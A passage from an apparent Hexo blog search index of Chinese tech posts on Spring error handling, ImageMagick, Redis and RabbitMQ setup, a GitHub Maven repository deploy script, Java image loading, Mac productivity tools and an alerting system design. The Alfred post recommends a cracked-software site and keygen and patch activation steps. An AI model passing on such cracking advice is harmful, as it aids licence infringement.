log.error(\"unexpected exception! request: {}, params: {} refer: {}, e: {}\", request.getRequestURI(), request.getParameterMap(), request.getHeader(\"referer\"), e); if (StringUtils.isBlank(e.getMessage())) { return ResponseWrapper.errorReturn(new Status(500, \"内部异常\")); } else { return ResponseWrapper.errorReturn(new Status(500, e.getMessage())); } }} 这里主要借助两个注解来实现，ControllerAdvice 和 ExceptionHandler II. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/02/04/SpringMVC统一异常处理/"},{"title":"imagemagic安装","text":"ImageMagic 安装ImageMagic/GraphicMagic 使用for java（im4java） 1. 环境配置一键安装方式 123456789101112yum install libjpeg-develyum install libpng-devel本地环境搭建sudo brew install jpegsudo brew install libpngsudo brew install GraphicsMagickgm convert input.jpg -thumbnail '100x100' output_1.jpggm convert -crop 640x960+0+0 test.jpg output.jpg 源码安装方式 安装jpeg 包 wget ftp://223.202.54.10/pub/web/php/libjpeg-6b.tar.gz 安装webp 包 wget http://www.imagemagick.org/download/delegates/libwebp-0.5.1.tar.gz 安装png 包 wget http://www.imagemagick.org/download/delegates/libpng-1.6.24.tar.gz 安装 graphicsmagick wget http://nchc.dl.sourceforge.net/project/graphicsmagick/graphicsmagick/1.3.22/GraphicsMagick-1.3.22.tar.gz 安装imagemagick wget http://www.imagemagick.org/download/ImageMagick.tar.gz 安装命令 sudo ./configure; sudo make; sudo make install 几个命令 make distclean 清除上次make的东西 裁图命令 convert test.jpg -crop 640x960+0+0 output.jpg 问题修复 linux 安装imagemagick 发现一直找不到 png的依赖，查阅需要安装 http://pkgconfig.freedesktop.org/releases/pkg-config-0.28.tar.gz imagemagick 依然无法读取png图片 执行 convert 提示linux shared libraries 不包含某个库 –》临时解决方案： export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH 一劳永逸的方案：https://my.oschina.net/guanyue/blog/220264 vi /etc/ld.so.conf 在这个文件里加入：/usr/local/lib 来指明共享库的搜索位置 然后再执行/sbin/ldconf 2. 常用命令汇总图片操作方式 裁图 + 旋转 + 缩放 + 缩略图 + 翻转（flip） + 镜像（flop） + 水印(composite) + 边框(border) 裁图 convert test.jpg -crop 640x960+0+0 output.jpg 旋转 convert test.jpg -rotate 90 output.jpg 缩放 convert test.jpg -resize 200x200 output.jpg 强制宽高缩放 convert test.jpg -resize 200x200! output.jpg 缩略图 convert -thumbnail 200x300 test.jpg thumb.jpg 翻转 上下翻转： convert -flip foo.png bar.png 左右翻转： convert -flop foo.png bar.png 图片合成方式 水印 ：composite -gravity northwest -dissolve 100 -geometry +0+0 water.png temp.jpg out.jpg 其中 gravity 表示起始位置dissolve 表示水印图片的透明度， 100 表示100%透明water.png为水印图， temp.jpg 为背景图, out.jpg 为输出图片 方法二：convert -gravity southeast -geometry +5+10 -composite test.jpg water.png out.jpg water.png作为水印图片，合在test.jpg的东南 （5，10）坐标处，输出文件为 out.jpg 添加边框 : convert -border 6x6 -bordercolor &quot;#ffffff&quot; test.jpg bord.jpg 去除边框 : convert -thumbnail 200x300 test.jpg thumb.jpg II. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/08/09/imagemagic安装/"},{"title":"redis安装","text":"I. redis安装centos安装并后台启动redis记录过程 安装redis命令，比较简单 1yum install redis 后台启动redis方式： 123456789101112# 设置redis.conf文件，开启后台启动vim /etc/redis.conf## 找到 daemonize no 这一行## 修改成yes，并保存daemonize yes## 启动redisredis-server /etc/redis.conf 查看redis启动是否正常 12# 查看进程号ps -ef | grep redis 客户端连接测试 12345redis-cli&gt; set test 123&gt; get test&gt; expire test II. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/24/redis安装/"},{"title":"借助GitHub搭建属于自己的maven仓库教程","text":"I. 背景在Github上也写了不少的项目了，然后经常遇到的一个问题就是，很多自己写的项目，希望在另外一个项目中使用时，只能把这个项目下载下来，相当之不方便 因为大多数的java后端项目都是基于maven管理依赖的，所以就希望能有一个公共的maven仓库，可以把自己的项目扔进去，然后再应用就方便很多了 基于此，就有了本文这个教程了 II. 实现步骤1. github仓库建立新建一个repository的前提是有github帐号，默认看到本文的是有帐号的 首先是在github上新建一个仓库，命令随意，如我新建项目为 https://github.com/liuyueyi/maven-repository 2. 配置本地仓库本地指定一个目录，新建文件夹 maven-repository, 如我的本地配置如下 1234567891011121314## 进入目录cd /Users/yihui/GitHub## 新建目录mkdir maven-repository; cd maven-repository## 新建repository目录# 这个目录下面就是存放我们deploy的项目相关信息# 也就是说我们项目deploy指定的目录，就是这里mkdir repository## 新增一个readme文档# 保持良好的习惯，每个项目都有一个说明文档touch README.md 这个目录结构为什么是这样的？ 我们直接看maven配置中默认的目录结构，同样拷贝一份出来而已 3. 仓库关联将本地的仓库和远程的github仓库关联起来，执行的命令也比较简单了 1234git add .git commit -m 'first comit'git remote add origin https://github.com/liuyueyi/maven-repository.gitgit push -u origin master 接着就是进行分支管理了 约定将项目中的snapshot版，deploy到仓库的 snapshot分支上 约定将项目中的release版，deploy到仓库的 release分支上 master分支管理所有的版本 所以需要新创建两个分支 12345678## 创建snapshot分支git checkout -b snapshot git push origin snapshot# 也可以使用 git branch snapshot , 我通常用上面哪个，创建并切换分支## 创建release分支git checkout -b releasegit push origin release 4. 项目deploy项目的deploy，就需要主动的指定一下deploy的地址了，所以我们的deploy命令如下 12## deploy项目到本地仓库mvn clean deploy -Dmaven.test.skip -DaltDeploymentRepository=self-mvn-repo::default::file:/Users/yihui/GitHub/maven-repository/repository 上面的命令就比较常见了，主要需要注意的是file后面的参数，根据自己前面设置的本地仓库目录来进行替换 5. deploy脚本每次进行上面一大串的命令，不太好记，特别是不同的版本deploy到不同的分支上，主动去切换分支并上传，也挺麻烦，所以就有必要写一个deploy的脚本了 由于shell实在是不太会写，所以下面的脚本只能以凑合能用来说了 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/bin/bashif [ $# != 1 ];then echo 'deploy argument [snapshot(s for short) | release(r for short) ] needed!' exit 0fi## deploy参数，snapshot 表示快照包，简写为s， release表示正式包，简写为rarg=$1DEPLOY_PATH=/Users/yihui/GitHub/maven-repository/CURRENT_PATH=`pwd`deployFunc(){ br=$1 ## 快照包发布 cd $DEPLOY_PATH ## 切换对应分支 git checkout $br cd $CURRENT_PATH # 开始deploy mvn clean deploy -Dmaven.test.skip -DaltDeploymentRepository=self-mvn-repo::default::file:/Users/yihui/GitHub/maven-repository/repository # deploy 完成,提交 cd $DEPLOY_PATH git add -am 'deploy' git push origin $br # 合并master分支 git checkout master git merge $br git commit -am 'merge' git push origin master cd $CURRENT_PATH}if [ $arg = 'snapshot' ] || [ $arg = 's' ];then ## 快照包发布 deployFunc snapshotelif [ $arg = 'release' ] || [ $arg = 'r' ];then ## 正式包发布 deployFunc releaseelse echo 'argument should be snapshot(s for short) or release(r for short). like: `sh deploy.sh snapshot` or `sh deploy.sh s`'fi 将上面的脚本，考本到项目的根目录下，然后执行 12345678chmod +x deploy.sh## 发布快照包./deploy.sh s# sh deploy.sh snapshot 也可以## 发布正式包./deploy.sh r 基于此，整个步骤完成 III. 使用上面仓库的基本搭建算是ok了，然后就是使用了，maven的pom文件应该怎么配置呢？ 首先是添加仓库地址 添加仓库 如果要区分snapshot和release的话，如下配置 12345678910&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo-snap&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/snapshot/repository&lt;/url&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo-release&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/release/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 如果不care的话，直接添加下面的即可 123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 仓库配置完毕之后，直接引入依赖即可，如依赖我的Quick-Alarm包，就可以添加下面的依赖配置 12345&lt;dependency&gt; &lt;groupId&gt;com.hust.hui.alarm&lt;/groupId&gt; &lt;artifactId&gt;core&lt;/artifactId&gt; &lt;version&gt;0.1&lt;/version&gt;&lt;/dependency&gt; IV. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2018/02/12/借助GitHub搭建属于自己的maven仓库教程/"},{"title":"兼容ImageIO读取jpeg图片变红","text":"兼容ImageIO读取jpeg图片变红 使用ImageIO.read()方法，加载图片为BufferedImage对象时，对于某些图片，会出现变红的case 问题重现有问题的图片： 测试验证代码 123456789101112/** * 图片读取之后，颜色变红的测试 */@Testpublic void testLoadRedImg() throws IOException { String url = \"http://s17.mogucdn.com/mlcdn/c45406/170418_68lkjddg3bll08h9c9bk0d8ihkffi_800x1200.jpg\"; URL u = new URL(url); BufferedImage bf = ImageIO.read(u); ImageIO.write System.out.println(\"--over--\");} debug截图如下： 问题兼容不实用ImageIO来加载图片，改用Toolkit来实现图片读取，然后再将读取到的图片绘制到BufferedImage对象上 1234567891011121314151617181920212223242526272829303132333435363738394041@Testpublic void testLoadRedImg2() throws MalformedURLException { String url = \"http://s17.mogucdn.com/mlcdn/c45406/170418_68lkjddg3bll08h9c9bk0d8ihkffi_800x1200.jpg\"; URL u = new URL(url); Image img = Toolkit.getDefaultToolkit().getImage(u); BufferedImage bf = toBufferedImage(img); System.out.println(\"eeee\");}static BufferedImage toBufferedImage(Image image) { if (image instanceof BufferedImage) { return (BufferedImage) image; } // This code ensures that all the pixels in the image are loaded image = new ImageIcon(image).getImage(); BufferedImage bimage = null; GraphicsEnvironment ge = GraphicsEnvironment .getLocalGraphicsEnvironment(); try { int transparency = Transparency.OPAQUE; GraphicsDevice gs = ge.getDefaultScreenDevice(); GraphicsConfiguration gc = gs.getDefaultConfiguration(); bimage = gc.createCompatibleImage(image.getWidth(null), image.getHeight(null), transparency); } catch (HeadlessException e) { // The system does not have a screen } if (bimage == null) { // Create a buffered image using the default color model int type = BufferedImage.TYPE_INT_RGB; bimage = new BufferedImage(image.getWidth(null), image.getHeight(null), type); } // Copy image to buffered image Graphics g = bimage.createGraphics(); // Paint the image onto the buffered image g.drawImage(image, 0, 0, null); g.dispose(); return bimage;} 实测验证 为什么会出现这个问题： ImageIO.read()方法读取图片时可能存在不正确处理图片ICC信息的问题，ICC为JPEG图片格式中的一种头部信息，导致渲染图片前景色时蒙上一层红色。 其他参考 Java处理某些图片红色问题 扫描关注，java分享","link":"/hexblog/2018/01/22/兼容ImageIO读取jpeg图片变红/"},{"title":"常用Chrome工具","text":"I. Chrome常用插件记录下使用到的Chrome插件，有些挺有意思的东西 1. Website IP在网页的右下角(or左下角)显示当前网页的服务器IP，用来判断当前的系统的工作环境非常有用，特别是在线下、预发和生产环境的切换时，判断host是否切换的时候 2. Adblock Plus拦截小广告 3. Adkill and Media download拦截视频广告，我常逛的优酷，腾讯视频，爱奇艺，芒果的视频广告都被可以被吃掉，节省两分钟的等待时间 4. GitCodeTree码云提供的gitee，侧边栏提供一个直接查看代码的树状结构 5. JSON Editor写json的插件 6. Json Handlerjson结构化，针对请求直接返回json串的场景用起来比较爽，除了结构化输出之外，还可以修改json串内容，个人感觉比JSONView好用 7. Octotreegithub源码视图工具，和前面的 GitCodeTree 差不多 8. Postman模拟各种http请求 9. Vimium以vim的方式操作浏览器页面，实现真正的无鼠标全键盘操作 10. 二维码(QR码)生成器(QR Code Generator)当前网页生成一个二维码，方便手机打开 11. 捕捉网页截图 - FireShot网页截图工具，可以截长图文，但是在网页特别长时，截取失败，有些时候用起来还可以 12. 掘金覆盖默认的新打开标签页，显示一些有意思的git项目和掘金上的优秀博文 13. Encoder(自定义实现)自己写的一个插件，主要是为了提供一些常见的转换， 源码&amp;下载地址: Chrome-Coder 时间戳和日期的相互转换 url编码解码 base64编码解码 unicode编码解码 14. Chrome-ImgRender自己写的插件，源码&amp;下载地址: Chrome-ImgRender 选择网页中的dom结构，输出图片的小工具，使用演示如： II. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/19/常用Chrome工具/"},{"title":"常用Popclip工具","text":"I. PopClip工具PopClip是mac上的一个工具集，最大的特点就是扩展，复制一段文本，然后根据你的需求写插件，把赋值的文本作为输出，做一些你想干的事 基于PopClip，也写了一些小工具，主要是php写的，写插件的教程还是比较简单的，一个配置文件Config.plist和一个脚本文件xxx.php即可 1. 实现一个插件流程以JSON格式序列化为demo进行演示，如何从0到1创建一个popclip插件，先看一下最终的成品 一个插件的文件比较简单，主要有两个 Config.plist 具体的脚本文件 a. 配置文件下面是一个实际的配置，里面指定了两个脚本： 第一个是 json2str.php，这个脚本实现将json转换为单行字符串，在插件上显示的名字就是 JsonStr, 采用的php编写实现 第二个是 str2json.php 需要注意的是里面正则规则，这个主要是用来表示当你划中一段文本之后，是否会出现这个插件的规则（比如时间戳和日期的相互转换，只有选中纯数字时，才支持时间戳转日期） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;&lt;plist version=\"1.0\"&gt;&lt;dict&gt; &lt;key&gt;Actions&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;After&lt;/key&gt; &lt;string&gt;paste-result&lt;/string&gt; &lt;key&gt;Regular Expression&lt;/key&gt; &lt;!-- 正则匹配规则，*号表示任意选中的内容都会激活这个插件 --&gt; &lt;string&gt;*&lt;/string&gt; &lt;key&gt;Script Interpreter&lt;/key&gt; &lt;string&gt;/usr/bin/php&lt;/string&gt; &lt;key&gt;Shell Script File&lt;/key&gt; &lt;!-- 执行具体逻辑的脚本名 --&gt; &lt;string&gt;json2str.php&lt;/string&gt; &lt;key&gt;Title&lt;/key&gt; &lt;!-- 插件的name --&gt; &lt;string&gt;JsonStr&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;After&lt;/key&gt; &lt;string&gt;paste-result&lt;/string&gt; &lt;key&gt;Regular Expression&lt;/key&gt; &lt;string&gt;*&lt;/string&gt; &lt;key&gt;Script Interpreter&lt;/key&gt; &lt;string&gt;/usr/bin/php&lt;/string&gt; &lt;key&gt;Shell Script File&lt;/key&gt; &lt;string&gt;str2json.php&lt;/string&gt; &lt;key&gt;Title&lt;/key&gt; &lt;string&gt;StrJson&lt;/string&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;Extension Description&lt;/key&gt; &lt;!-- 描述 --&gt; &lt;string&gt;remove json space or stringfy json str&lt;/string&gt; &lt;key&gt;Extension Name&lt;/key&gt; &lt;string&gt;JSON&lt;/string&gt; &lt;key&gt;Credits&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;Link&lt;/key&gt; &lt;string&gt;mailto:bangzewu@126.com&lt;/string&gt; &lt;key&gt;Name&lt;/key&gt; &lt;string&gt;Json序列化&lt;/string&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;Extension Identifier&lt;/key&gt; &lt;string&gt;popclip.extension.json-covert&lt;/string&gt; &lt;key&gt;Required Software Version&lt;/key&gt; &lt;integer&gt;695&lt;/integer&gt;&lt;/dict&gt;&lt;/plist&gt; b. 脚本文件这个里面就是写具体的业务逻辑，一般是将粘贴板中的内容作为输入，然后进行一段业务逻辑，然后输出到粘贴板内 如str2json.php 12345678&lt;?php$input=getenv(\"POPCLIP_TEXT\");if(empty($input)) { echo ''; } else { $param = json_decode($input); echo json_encode($param, JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES);} 注意第一行，获取输入 $input=getenv(&quot;POPCLIP_TEXT&quot;);, 不同的脚本有不同的获取方式 输出就比较简单了，传统的输出方法，会重写到粘贴板内 echo 'xxx'; c. 打包上面完成之后，就是打包安装了，流程如下： 新建一个文件夹，后缀为.popclipext，将.plist和脚本文件拷贝到新的文件夹下 压缩： zip -r xxx.popclipextz xxx.popclipext/ 双击上面生成的文件，确认安装即可 说明： 上面新建的文件夹，一定要以.popclipext结尾 2. 我的插件a. base64编码作用：实现base64编码解码 源码地址: base64 demo: b. 日期&amp;时间戳作用：实现日期和时间戳的相互转换 源码地址： date demo: c. unicode字符转中文源码 : unicode d. json格式化源码: json e. url编码解码源码: url II. 其他工程地址所有的插件都可以访问： PopClip 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/19/常用Popclip工具/"},{"title":"5. 报警系统QuickAlarm之频率统计及接口封装","text":"前面将报警规则的制定加载解析，以及报警执行器的定义加载和扩展进行了讲解，基本上核心的内容已经完结，接下来剩下内容就比较简单了 报警频率的统计 报警线程池 对外封装统一可用的解耦 I. 报警频率统计1. 设计前面在解析报警规则时，就有一个count参数，用来确定具体选择什么报警执行器的核心参数，我们维护的方法也比较简单： 针对报警类型，进行计数统计，没调用一次，则计数+1 每分钟清零一次 2. 实现因为每种报警类型，都维护一个独立的计数器 定义一个map来存储对应关系 1private ConcurrentHashMap&lt;String, AtomicInteger&gt; alarmCountMap; 每分钟执行一次清零 1234567// 每分钟清零一把报警计数ScheduledExecutorService scheduleExecutorService = Executors.newScheduledThreadPool(1);scheduleExecutorService.scheduleAtFixedRate(() -&gt; { for (Map.Entry&lt;String, AtomicInteger&gt; entry : alarmCountMap.entrySet()) { entry.getValue().set(0); }}, 0, 1, TimeUnit.MINUTES); 注意上面的实现，就有什么问题？ 有没有可能因为map中的数据过大（或者gc什么原因），导致每次清零花不少的时间，而导致计数不准呢？ （先不给出回答） 计数加1操作 1234567891011121314151617/** * 线程安全的获取报警总数 并自动加1 * * @param key * @return */private int getAlarmCount(String key) { if (!alarmCountMap.containsKey(key)) { synchronized (this) { if (!alarmCountMap.containsKey(key)) { alarmCountMap.put(key, new AtomicInteger(0)); } } } return alarmCountMap.get(key).addAndGet(1);} II. 报警线程池目前也只是提供了一个非常简单的线程池实现，后面的考虑是抽象一个基于forkjoin的并发框架来处理（主要是最近接触到一个大神基于forkjoin写的并发器组件挺厉害的，所以等我研究透了，山寨一个） 123456// 报警线程池private ExecutorService alarmExecutorService = new ThreadPoolExecutor(3, 5, 60, TimeUnit.SECONDS, new LinkedBlockingDeque&lt;&gt;(10), new DefaultThreadFactory(\"sms-sender\"), new ThreadPoolExecutor.CallerRunsPolicy()); 任务提交执行 12345678private void doSend(final ExecuteHelper executeHelper, final AlarmContent alarmContent) { alarmExecutorService.execute(() -&gt; executeHelper.getIExecute().sendMsg( executeHelper.getUsers(), alarmContent.getTitle(), alarmContent.getContent()));} III. 接口封装这个就没什么好说的了 123456789101112131415161718192021222324252627282930313233343536373839404142public void sendMsg(String key, String content) { sendMsg(new AlarmContent(key, null, content));}public void sendMsg(String key, String title, String content) { sendMsg(new AlarmContent(key, title, content));}/** * 1. 获取报警的配置项 * 2. 获取当前报警的次数 * 3. 选择适当的报警类型 * 4. 执行报警 * 5. 报警次数+1 * * @param alarmContent */private void sendMsg(AlarmContent alarmContent) { try { // get alarm config AlarmConfig alarmConfig = confLoader.getAlarmConfig(alarmContent.key); // get alarm count int count = getAlarmCount(alarmContent.key); alarmContent.setCount(count); ExecuteHelper executeHelper; if (confLoader.alarmEnable()) { // get alarm execute executeHelper = AlarmExecuteSelector.getExecute(alarmConfig, count); } else { // 报警关闭, 则走空报警流程, 将报警信息写入日志文件 executeHelper = AlarmExecuteSelector.getDefaultExecute(); } // do send msg doSend(executeHelper, alarmContent); } catch (Exception e) { logger.error(\"AlarmWrapper.sendMsg error! content:{}, e:{}\", alarmContent, e); }} 接口封装完毕之后如何使用呢？ 我们使用单例模式封装了唯一对外使用的类AlarmWrapper，使用起来也比较简单，下面就是一个测试case 12345678910111213@Testpublic void sendMsg() throws InterruptedException { String key = \"NPE\"; String title = \"NPE异常\"; String msg = \"出现NPE异常了!!!\"; AlarmWrapper.getInstance().sendMsg(key, title, msg); // 微信报警 // 不存在异常配置类型, 采用默认报警, 次数较小, 则直接部署出 AlarmWrapper.getInstance().sendMsg(\"zzz\", \"不存在xxx异常配置\", \"报警嗒嗒嗒嗒\"); Thread.sleep(1000);} 使用起来比较简单，就那么一行即可，从这个使用也可以知道，整个初始化，就是在这个对象首次被访问时进行 构造函数内容如下: 12345678910private AlarmWrapper() { // 记录每种异常的报警数 alarmCountMap = new ConcurrentHashMap&lt;&gt;(); // 加载报警配置信息 confLoader = ConfLoaderFactory.loader(); // 初始化线程池 initExecutorService();} 所有如果你希望在自己的应用使用之前就加载好所有的配置，不妨提前执行一下 AlarmWrapper.getInstance() IV. 小结基于此，整个系统设计基本上完成，当然代码层面也ok了，剩下的就是使用手册了 再看一下我们的整个逻辑，基本上就是下面这个流程了 提交报警 封装报警内容（报警类型，报警主题，报警内容） 维护报警计数（每分钟计数清零，每个报警类型对应一个报警计数） 选择报警 根据报警类型选择报警规则 根据报警规则，和当前报警频率选择报警执行器 若不开启区间映射，则返回默认执行器 否则遍历所有执行器的报警频率区间，选择匹配的报警规则 执行报警 封装报警任务，提交线程池 报警执行器内部实现具体报警逻辑 V. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目: QuickAlarm 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2018/02/11/报警系统QuickAlarm之频率统计及接口封装/"},{"title":"常用Alfred工具","text":"I. Alfred工具alfred可以说是mac上必备的一个app了，可以极大的提高工作效率，再加上它支持自定义实现各种扩展，完全可以满足大部分的需求场景了 1. 安装首先下载安装包，推荐一个神奇的网站，下载各种mac的破解软件，工具下载链接: http://xclient.info/s/alfred.html 破解方式： 点击下载包里面的keygen 点击patch，会打开目录，选择alfred，点击激活 重启alfred即可 2. 几个插件下载包内直接包含了所有的流程和源码，也没什么好具体说的，下载完毕之后双击即可 a. 日期与时间戳点击下载：time.alfredworkflow demo: b. md5点击下载: md5.alfredworkflow demo: c. url编码点击下载: URL编码.alfredworkflow demo: d. 分库分表点击下载: table.alfredworkflow demo: II. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/19/常用Alfred插件/"},{"title":"1. 报警系统QuickAlarm设计总纲","text":"背景日常的系统中，报警是不可缺少的一环，目前报警方式很多，最常见的有直接打日志，微信报警，短信报警，邮件报警等；而涉及到报警，一般不可避免的需要提前设置一些基本信息，如报警方式，报警频率，报警用户，开关等； 另外一个常见的问题是一般采用的是单一的报警方式，比如不管什么类型的报警全部都用短信方式触达，然后就会发现手机时常处于被淹没的状态了，久而久之对报警短信就不会敏感了 目标因此我们准备设计一个通用的报警框架 可以自由选择报警方式， 支持用户自定义报警方式拓展 支持动态的报警配置， 支持用户自定义报警规则拓展 支持报警方式自动切换规则设定 支持报警方式自定义自动切换规则拓展 设计整体来说，报警主要可以划分为三个步骤，如下： 提交报警：对外部使用者提供的接口 选择报警：根据报警相关信息，选择具体的报警执行单元 执行报警：实现具体的报警逻辑 从任务划分上来看，比较清晰简单，但是每一块的内容又必须可以拓展， 选择报警： 报警规则的制定 报警规则加载器 ConfLoader 报警规则变更的触发器 ConfChangeTrigger 报警规则解析器 ConfParse ： 解析文本格式报警规则为业务对象 AlarmSelector ：根据报警规则和报警类型，选择具体报警执行器 AlarmExecute 执行报警： 线程池执行（以防止影响主业务流程） AlarmExecute的动态拓展（支持用户自定义的报警器实现） 实际的报警逻辑 根据上面的拆解，在应用启动的时候，就有一些事情必须去做了 ConfLoader的选择 报警规则加载 AlarmExecute的加载（包括默认的+自定义实现的） 下图显示在应用启动时，报警规则解析的相关步骤 至于报警执行器的加载就比较简单了，如下图 因此，整个的工作流程如下图 任务拆解通过前面的任务设计之后，对需要做的东西有了一个大概的脉络了，因此在正式操刀实现之前，下对整个架构进行任务拆解，看下可以具体的执行步骤可以怎么来 最直接的就是设计报警执行器AlarmExecute 定义基本接口 制定自定义扩展规则 接下来就是设计报警规则 如何加载报警规则？ 报警规则具体的定义细则 报警规则的解析：即根据报警类型来获取报警执行器 报警规则动态更新支持 报警线程池 维护报警队列 报警的计数与频率控制 封装对外使用接口 所以，通过上面的分析可以看出，这个系统的结构还是蛮简单的，整个只需要四个部分就可以搞定，其中最主要的就是前面两个了，后面将分别说明 小结做一个东西，当然是希望可以带来一些用处，或者能学习到什么东西，才不枉花费精力来折腾一下，那么我们这个报警系统，究竟有什么用，或者可以从中学习到什么东西呢？ 用途： 支持灵活可配的报警规则，以及具体报警业务的自定义拓展 目标就是统一报警的使用姿势，也就是不管什么报警，都一个姿势，但是内部可以玩出各种花样，对使用者而言就方便简洁了 学习： 抛开特有的知识点，可以抽象一些公共可用的地方，大概就下面这两点了 我们可以如何支持功能的动态可拓展 线程池的使用 IV. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注，java分享","link":"/hexblog/2018/02/09/报警系统QuickAlarm总纲/"},{"title":"胡思乱想123","text":"一些异想天开的小想法 1. 俄罗斯方块俄罗斯方块堆积后，总会有空格留下，那么如何去填空就是个问题，从这里可以引入一个新的game思路 在一堆由方格拼成的墙面上，有很多的空个，现在需要你去填空，然后消去相同色，得分；或者拼成一排则得分或者是自由移动方块，来拼接最长的相连方块； 或者是移动，组成各种有趣的图案","link":"/hexblog/2018/01/15/胡思乱想123/"},{"title":"阿里云服务器基本环境配置","text":"阿里云服务器基本环境配置I. RabbitMQ安装1. 安装123yum install erlangwget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.15/rabbitmq-server-3.6.15-1.el6.noarch.rpmyum install rabbitmq-server-3.6.15-1.el6.noarch.rpm 2. 插件开启123rabbitmq-plugins enable rabbitmq_management# 启动rabbitmq-server -detached 3. 权限设置123rabbitmqctl add_user admin xxx12345rabbitmqctl set_user_tags admin administratorrabbitmqctl set_permissions -p / admin '.*' '.*' '.*' 4. 添加虚拟目录12345678910## 添加虚拟目录rabbitmqctl add_vhost test1rabbitmqctl add_vhost test2rabbitmqctl add_vhost test3rabbitmqctl add_vhost test4## 设置权限rabbitmqctl set_permissions -p test1 admin '.*' '.*' '.*'rabbitmqctl set_permissions -p test2 admin '.*' '.*' '.*'rabbitmqctl set_permissions -p test3 admin '.*' '.*' '.*'rabbitmqctl set_permissions -p test4 admin '.*' '.*' '.*' 5. rabbitmq服务启动关闭123456## 关闭rabbitmqctl stop## 启动rabbitmq-server -detached## 状态rabbitmqctl status 6. 说明 在服务启动之后，再执行开启rabbitmq插件，新增virtual host等操作 控制台默认端口号为:15672 阿里云服务器查看控制台需要在安全组中添加端口号的访问 II. redis 安装1. 安装12345wget http://download.redis.io/releases/redis-4.0.6.tar.gztar -zxvf redis-4.0.6.tar.gzcd redis-4.0.6makemake install 2. 配置配置文件配置，实现单台机器上运行多个redis实例 123456mkdir redisclustercd redisclustermkdir one twocd ..cp redis-4.0.6/redis.con rediscluster/one/cp redis-4.0.6/redis.con rediscluster/two/ 修改redis.conf文件 123456789101112# 设置密码requirepass 